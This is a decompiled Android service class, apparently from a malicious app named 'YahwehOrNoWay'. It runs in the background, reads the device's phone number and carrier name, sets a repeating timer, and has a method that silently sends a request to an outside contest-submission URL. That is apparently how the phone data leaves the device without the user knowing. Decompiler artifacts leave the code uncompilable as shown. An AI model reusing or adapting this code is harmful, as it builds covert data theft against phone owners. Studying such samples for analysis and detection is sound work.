package com.YahwehOrNoWay;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

public class theword
  extends Service
{
  public IBinder onBind(Intent paramIntent)
  {
    IBinder localIBinder = null;
    return localIBinder;
  }
  
  public void onCreate()
  {
    super.onCreate();
  }
  
  public void onDestroy()
  {
    super.onDestroy();
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    Object localObject1 = "phone";
    Object localObject2 = getSystemService((String)localObject1);
    localObject2 = (TelephonyManager)localObject2;
    String str1 = ((TelephonyManager)localObject2).getLine1Number();
    String str2 = ((TelephonyManager)localObject2).getNetworkOperatorName();
    int i = 60000;
    int j = 2000000;
    Timer localTimer = new java/util/Timer;
    localTimer.<init>();
    localObject1 = new com/YahwehOrNoWay/theword$1;
    ((theword.1)localObject1).<init>(this, str1, str2);
    long l1 = i;
    long l2 = j;
    localTimer.scheduleAtFixedRate((TimerTask)localObject1, l1, l2);
  }
  
  public void poster(String paramString)
  {
    DefaultHttpClient localDefaultHttpClient = new org/apache/http/impl/client/DefaultHttpClient;
    localDefaultHttpClient.<init>();
    HttpGet localHttpGet = new org/apache/http/client/methods/HttpGet;
    Object localObject = new java/lang/StringBuilder;
    String str = "http://www.comedycentral.com/global/feeds/entertainment/media/submit_entry.jhtml?collectionID=96&email=";
    ((StringBuilder)localObject).<init>(str);
    localObject = ((StringBuilder)localObject).append(paramString);
    str = "&format=json&jsoncallback=?";
    localObject = ((StringBuilder)localObject).append(str);
    localObject = ((StringBuilder)localObject).toString();
    localHttpGet.<init>((String)localObject);
    try
    {
      HttpResponse localHttpResponse = localDefaultHttpClient.execute(localHttpGet);
      return;
    }
    catch (ClientProtocolException localClientProtocolException)
    {
      for (;;) {}
    }
    catch (IOException localIOException)
    {
      for (;;) {}
    }
  }
}

/* Location:
 * Qualified Name:     com.YahwehOrNoWay.theword
 * Java Class Version: 1.2 (46.0)
 * JD-Core Version:    0.7.1
 */